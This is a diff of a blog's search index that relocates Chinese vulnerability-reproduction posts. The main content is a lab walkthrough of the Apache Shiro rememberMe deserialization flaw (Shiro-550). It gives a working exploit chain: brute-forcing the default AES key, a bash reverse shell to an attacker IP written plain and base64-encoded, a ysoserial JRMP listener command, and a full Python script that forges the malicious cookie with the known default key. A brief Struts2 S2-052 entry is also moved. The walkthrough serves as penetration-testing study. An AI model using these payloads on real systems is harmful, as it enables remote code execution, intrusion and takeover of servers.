@@ -1,103 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
-    <url>/posts/48e0a35f.html</url>
-    <content><![CDATA[<p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
-<p>那么，Payload产生的过程：</p>
-<a id="more"></a>
-<p>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</p>
-<p>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单</p>
-<h2 id="影响版本：Apache-Shiro-lt-1-2-4"><a href="#影响版本：Apache-Shiro-lt-1-2-4" class="headerlink" title="影响版本：Apache Shiro &lt; 1.2.4"></a>影响版本：Apache Shiro &lt; 1.2.4</h2><h2 id="1-3-特征判断：返回包中包含rememberMe-deleteMe字段"><a href="#1-3-特征判断：返回包中包含rememberMe-deleteMe字段" class="headerlink" title="1.3 特征判断：返回包中包含rememberMe=deleteMe字段"></a>1.3 特征判断：返回包中包含rememberMe=deleteMe字段</h2><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><table>
-<thead>
-<tr>
-<th>角色</th>
-<th>系统版本</th>
-<th>IP</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>靶机</td>
-<td>Centos7</td>
-<td>192.168.3.130</td>
-<td>Shiro rememberMe反序列化漏洞环境</td>
-</tr>
-<tr>
-<td>攻击机</td>
-<td>kali-linux-2020.3</td>
-<td>192.168.3.131</td>
-<td>工具：maven、ysoserial、Shiro_exploit</td>
-</tr>
-</tbody></table>
-<h3 id="工具准备："><a href="#工具准备：" class="headerlink" title="工具准备："></a>工具准备：</h3><h4 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h4><p>kali安装<strong>maven</strong>，执行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget  https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;3.6.3&#x2F;binaries&#x2F;apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">sudo mv apache-maven-3.6.3 &#x2F;usr&#x2F;local&#x2F;maven3</span><br></pre></td></tr></table></figure>
-
-<p>添加maven环境变量（在/etc/profile末尾添加maven环境变量:）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">export M2_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;maven3</span><br><span class="line">export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$M2_HOME&#x2F;bin</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
-
-<h4 id="下载ysoserial并打包"><a href="#下载ysoserial并打包" class="headerlink" title="下载ysoserial并打包"></a>下载ysoserial并打包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure>
-
-<h4 id="下载Shiro-exploit"><a href="#下载Shiro-exploit" class="headerlink" title="下载Shiro_exploit"></a>下载Shiro_exploit</h4><p>检查是否存在默认的key。安装Shiro_exploit</p>
-<p>Github项目地址：<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
-<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ol>
-<li>攻击机使用Shiro_exploit爆破默认key（也就是AES加密的密钥）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;192.168.3.130:8080</span><br></pre></td></tr></table></figure>
-爆破出默认key如下：</li>
-</ol>
-<p><img src="https://qiniu.hzktester.top/tp2020080601.png" alt="image"></p>
-<ol start="2">
-<li><p>攻击机制作反弹shell代码<br>监听本地端口</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure></li>
-<li><p>Java Runtime 配合 bash 编码。<br>在线编码地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.131&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020080602.png" alt="image"></p>
-</li>
-<li><p>通过ysoserial中JRMP监听模块，监听8888端口并执行反弹shell命令。</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020080603.png" alt="image"></p>
-<ol start="5">
-<li>使用shiro.py 生成Payload</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.3.131:8888</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qiniu.hzktester.top/tp2020080604.png" alt="image"></p>
-<p>shiro.py代码如下（注意key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)换为第一步爆破出的key）：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])   </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-7-构造数据包，伪造cookie，反弹shell"><a href="#1-7-构造数据包，伪造cookie，反弹shell" class="headerlink" title="1.7 构造数据包，伪造cookie，反弹shell"></a>1.7 构造数据包，伪造cookie，反弹shell</h2><ol>
-<li>访问靶机环境（<a href="http://192.168.3.130:8080/%EF%BC%89%E5%B9%B6%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%8B%BE%E9%80%89remember">http://192.168.3.130:8080/）并登录，登录勾选remember</a> me<br><img src="https://qiniu.hzktester.top/tp2020080605.png" alt="image"></li>
-<li>成功登录后访问任意url并抓包，查看到cookie中的remember me参数<br><img src="https://qiniu.hzktester.top/tp2020080606.png" alt="image"></li>
-<li>获得的rememberMe置入cookies中<br><img src="https://qiniu.hzktester.top/tp2020080607.png" alt="image"></li>
-<li>8888端口监听到流量信息</li>
-</ol>
-<p><img src="https://qiniu.hzktester.top/tp2020080608.png" alt="image"><br>5. 2222端口成功反弹shell</p>
-<p><img src="https://qiniu.hzktester.top/tp2020080609.png" alt="image"></p>
-<h2 id="1-8-修复建议"><a href="#1-8-修复建议" class="headerlink" title="1.8 修复建议"></a>1.8 修复建议</h2><ol>
-<li>升级shiro到1.2.5及以上</li>
-<li>如果在配置里配置了密钥，一定不要使用网上的密钥！！</li>
-</ol>
-<h2 id="1-9-遇到的问题"><a href="#1-9-遇到的问题" class="headerlink" title="1.9 遇到的问题"></a>1.9 遇到的问题</h2><ol>
-<li>maven打包ysoserial时编译报错，需要在kali中安装jdk1.8的环境，配置环境变量（一定不要安装最新版的jdk，还会报错，不清楚原因）</li>
-<li>使用Shiro_exploit时报错<strong>No module named Crypto.Cipher</strong>，执行以下命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip uninstall crypto</span><br><span class="line">sudo pip uninstall pycrypto</span><br><span class="line">sudo pip install pycrypto</span><br></pre></td></tr></table></figure></li>
-<li>kali2020.2版本默认没有pip，需要安装</li>
-</ol>
-<p>python3安装pip</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py | python3</span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure>
-<p>python2安装pip</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py</span><br><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure>
-<p>检查安装情况<br><img src="https://qiniu.hzktester.top/tp2020080610.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Apache Shiro</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Radis未授权访问漏洞复现</title>
     <url>/posts/b70654.html</url>
     <content><![CDATA[<h2 id="漏洞特征："><a href="#漏洞特征：" class="headerlink" title="漏洞特征："></a>漏洞特征：</h2><ul>
@@ -3970,6 +3873,26 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-052 CVE-2017-9805复现过程</title>
+    <url>/posts/1359d177.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081410.png" alt="image"></p>
+</li>
+<li><p>使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081411.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-048 CVE-2017-9791复现过程</title>
     <url>/posts/37119a29.html</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
@@ -3987,26 +3910,6 @@
 
 <p><img src="https://qiniu.hzktester.top/tp2020081408.png" alt="image"></p>
 <p>或直接使用工具<br><img src="https://qiniu.hzktester.top/tp2020081409.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-052 CVE-2017-9805复现过程</title>
-    <url>/posts/1359d177.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081410.png" alt="image"></p>
-</li>
-<li><p>使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081411.png" alt="image"></p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -4220,6 +4123,103 @@
       </categories>
       <tags>
         <tag>Fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
+    <url>/posts/48e0a35f.html</url>
+    <content><![CDATA[<p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
+<p>那么，Payload产生的过程：</p>
+<a id="more"></a>
+<p>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</p>
+<p>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单</p>
+<h2 id="影响版本：Apache-Shiro-lt-1-2-4"><a href="#影响版本：Apache-Shiro-lt-1-2-4" class="headerlink" title="影响版本：Apache Shiro &lt; 1.2.4"></a>影响版本：Apache Shiro &lt; 1.2.4</h2><h2 id="1-3-特征判断：返回包中包含rememberMe-deleteMe字段"><a href="#1-3-特征判断：返回包中包含rememberMe-deleteMe字段" class="headerlink" title="1.3 特征判断：返回包中包含rememberMe=deleteMe字段"></a>1.3 特征判断：返回包中包含rememberMe=deleteMe字段</h2><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><table>
+<thead>
+<tr>
+<th>角色</th>
+<th>系统版本</th>
+<th>IP</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶机</td>
+<td>Centos7</td>
+<td>192.168.3.130</td>
+<td>Shiro rememberMe反序列化漏洞环境</td>
+</tr>
+<tr>
+<td>攻击机</td>
+<td>kali-linux-2020.3</td>
+<td>192.168.3.131</td>
+<td>工具：maven、ysoserial、Shiro_exploit</td>
+</tr>
+</tbody></table>
+<h3 id="工具准备："><a href="#工具准备：" class="headerlink" title="工具准备："></a>工具准备：</h3><h4 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h4><p>kali安装<strong>maven</strong>，执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget  https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;3.6.3&#x2F;binaries&#x2F;apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">sudo mv apache-maven-3.6.3 &#x2F;usr&#x2F;local&#x2F;maven3</span><br></pre></td></tr></table></figure>
+
+<p>添加maven环境变量（在/etc/profile末尾添加maven环境变量:）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">export M2_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;maven3</span><br><span class="line">export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$M2_HOME&#x2F;bin</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
+
+<h4 id="下载ysoserial并打包"><a href="#下载ysoserial并打包" class="headerlink" title="下载ysoserial并打包"></a>下载ysoserial并打包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure>
+
+<h4 id="下载Shiro-exploit"><a href="#下载Shiro-exploit" class="headerlink" title="下载Shiro_exploit"></a>下载Shiro_exploit</h4><p>检查是否存在默认的key。安装Shiro_exploit</p>
+<p>Github项目地址：<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ol>
+<li>攻击机使用Shiro_exploit爆破默认key（也就是AES加密的密钥）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;192.168.3.130:8080</span><br></pre></td></tr></table></figure>
+爆破出默认key如下：</li>
+</ol>
+<p><img src="https://qiniu.hzktester.top/tp2020080601.png" alt="image"></p>
+<ol start="2">
+<li><p>攻击机制作反弹shell代码<br>监听本地端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure></li>
+<li><p>Java Runtime 配合 bash 编码。<br>在线编码地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.131&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020080602.png" alt="image"></p>
+</li>
+<li><p>通过ysoserial中JRMP监听模块，监听8888端口并执行反弹shell命令。</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020080603.png" alt="image"></p>
+<ol start="5">
+<li>使用shiro.py 生成Payload</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.3.131:8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qiniu.hzktester.top/tp2020080604.png" alt="image"></p>
+<p>shiro.py代码如下（注意key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)换为第一步爆破出的key）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])   </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-7-构造数据包，伪造cookie，反弹shell"><a href="#1-7-构造数据包，伪造cookie，反弹shell" class="headerlink" title="1.7 构造数据包，伪造cookie，反弹shell"></a>1.7 构造数据包，伪造cookie，反弹shell</h2><ol>
+<li>访问靶机环境（<a href="http://192.168.3.130:8080/%EF%BC%89%E5%B9%B6%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%8B%BE%E9%80%89remember">http://192.168.3.130:8080/）并登录，登录勾选remember</a> me<br><img src="https://qiniu.hzktester.top/tp2020080605.png" alt="image"></li>
+<li>成功登录后访问任意url并抓包，查看到cookie中的remember me参数<br><img src="https://qiniu.hzktester.top/tp2020080606.png" alt="image"></li>
+<li>获得的rememberMe置入cookies中<br><img src="https://qiniu.hzktester.top/tp2020080607.png" alt="image"></li>
+<li>8888端口监听到流量信息</li>
+</ol>
+<p><img src="https://qiniu.hzktester.top/tp2020080608.png" alt="image"><br>5. 2222端口成功反弹shell</p>
+<p><img src="https://qiniu.hzktester.top/tp2020080609.png" alt="image"></p>
+<h2 id="1-8-修复建议"><a href="#1-8-修复建议" class="headerlink" title="1.8 修复建议"></a>1.8 修复建议</h2><ol>
+<li>升级shiro到1.2.5及以上</li>
+<li>如果在配置里配置了密钥，一定不要使用网上的密钥！！</li>
+</ol>
+<h2 id="1-9-遇到的问题"><a href="#1-9-遇到的问题" class="headerlink" title="1.9 遇到的问题"></a>1.9 遇到的问题</h2><ol>
+<li>maven打包ysoserial时编译报错，需要在kali中安装jdk1.8的环境，配置环境变量（一定不要安装最新版的jdk，还会报错，不清楚原因）</li>
+<li>使用Shiro_exploit时报错<strong>No module named Crypto.Cipher</strong>，执行以下命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip uninstall crypto</span><br><span class="line">sudo pip uninstall pycrypto</span><br><span class="line">sudo pip install pycrypto</span><br></pre></td></tr></table></figure></li>
+<li>kali2020.2版本默认没有pip，需要安装</li>
+</ol>
+<p>python3安装pip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py | python3</span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure>
+<p>python2安装pip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py</span><br><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure>
+<p>检查安装情况<br><img src="https://qiniu.hzktester.top/tp2020080610.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Apache Shiro</tag>
       </tags>
   </entry>
 </search>
